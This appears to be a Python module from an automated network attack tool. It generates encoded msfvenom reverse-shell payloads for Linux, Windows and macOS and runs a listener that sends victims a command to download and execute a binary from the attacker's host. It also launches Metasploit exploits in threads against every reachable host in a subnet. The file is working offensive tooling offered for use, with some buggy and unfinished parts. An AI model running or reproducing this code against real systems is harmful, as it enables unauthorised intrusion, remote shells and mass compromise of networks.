from TrivialFunctions import *
from AttackPatterns import *
import threading
import socket
minPort = 1024
bind_ip = "0.0.0.0"
localIP = "192.168.56.101"

def encodeFile(OS, filename):
    #OR veil https://github.com/Veil-Framework/Veil
    #@TODO have casual cyphers
    if OS == "Linux":
        executeCommand("msfvenom -p PAYLOADFILE=" + filename + " -a x64 --platform linux -e x64/shikata_ga_nai -f raw -o " + filename)
    elif OS == "WIN":
        executeCommand("msfvenom -p PAYLOADFILE=" + filename + " -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o " + filename)
    output(3, "info", filename + " has been encoded")

def generatePrimer(OS,target):
    # @TODO add a step that compiles and obfuscate the constant part in Windows
    filename = "Primers/" + target
    if OS == "Linux":
        executeCommand("nuitka --standalone --recurse-all --output-dir=Primers Sources/main.py")
        executeCommand("mv Primers/main " + filename)
        executeCommand("msfvenom -p PAYLOADFILE=" + filename + " -a x86 --platform linux -e x86/shikata_ga_nai -f raw -o " + filename)
    if OS == "WIN":
        executeCommand("echo \"Not Yet Supported!\"")
    output(3, "info", "A primer for " + target + " has been generated")
    return filename

def generatePayload(OS, localIP, target):
    global minPort
    port = minPort + 1
    minPort = port
    if OS == "Linux":
        executeCommand("msfvenom -p linux/x64/shell/reverse_tcp LHOST=" + localIP + " LPORT=" + str(port) + " -f elf > Payloads/" + target + ".elf")
        output(3,"info", "Payload for:" + target + " generated at: Payloads/" + target + ".elf")
        encodeFile(OS,"Payloads/" + target + ".elf")
        primerName = generatePrimer("Linux",target)
        startListener(port, "wget "+ localIP +":8080/" + primerName + " & chmod +x " + primerName + " & ./" + primerName)
    elif OS == "WIN":
        executeCommand("msfvenom -p generic/shell_reverse_tcp LHOST=" + localIP + " LPORT=" + str(port) + " -f exe > Payloads/" + target + ".exe")
        output(3, "info", "Payload for:" + target + " generated at: Payloads/" + target + ".exe")
        encodeFile(OS, "Payloads/" + target + ".exe")
        primerName = generatePrimer("WIN",target)
        startListener(port, "wget "+ localIP +":8080/" + primerName + " & chmod +x " + primerName + " & ./" + primerName)
    elif OS == "OSX":
        executeCommand("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + localIP + " LPORT=" + str(port) + " -f macho > Payloads/" + target + ".macho")
        output(3, "info", "Payload for:" + target + " generated at: Payloads/" + target + ".macho")
        encodeFile(OS, "Payloads/" + target + ".macho")
        primerName = generatePrimer("OSX",target)
        startListener(port, "wget "+ localIP +":8080/" + primerName + " & chmod +x " + primerName + " & ./" + primerName)

def startListener(port, command):
    bind_port = port
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bind_ip, bind_port))
    server.listen(5)
    output(3,"info","Listener started on port: " + str(port))

    def handle_client(client_socket):

        # send back a packet
        client_socket.send(command)

        client_socket.close()

    while True:
        #@TODO add a timeout
        client, addr = server.accept()

        output(3,"success","Target: " + addr[0] + "has been compromised!")

        # spin up our client thread to handle incoming data
        client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()

def generateMetasploitResource(exploit, payload, target):
    name = target+exploit+".rb"
    playbook = "use " + exploit + "\n" + "set PAYLOAD " + payload + "\n" + "set RHOSTS " + target + "\n" + "run"
    writeToFile(name,playbook)
    return name

def attackThread(target):
    generatePayload("Linux", localIP, target)
    msfConsolePlaybook = generatePayload("Linux", localIP, target)
    executeCommand("msfconsole -r " + msfConsolePlaybook)

def attackTarget(target,openPorts):
    attackThreads = []
    for port in openPorts:
        if str(port) in exploits:
            if "metasploit" in exploits[str(port)]:
                for attack in exploits[str(port)]["metasploit"]:
                    output(2,"step","attempting to use exploit: " + attack + " on " + target)
                    attackThreads.append(threading.Thread(target=attackThread, args=(target,)))
                for thread in attackThreads:
                    thread.start()
                for thread in attackThreads:
                    thread.join()



def attackSubnet(subnet):
    attackSurface = json.loads(subnet.replace("\"","").replace("\'","\""))
    attackingThreads = []
    for target, ports in attackSurface.items():
        if target != localIP:
            attackingThreads.append(threading.Thread(target=attackTarget, args=(target,ports,)))
    for thread in attackingThreads:
        thread.start()
    for thread in attackingThreads:
        thread.join()

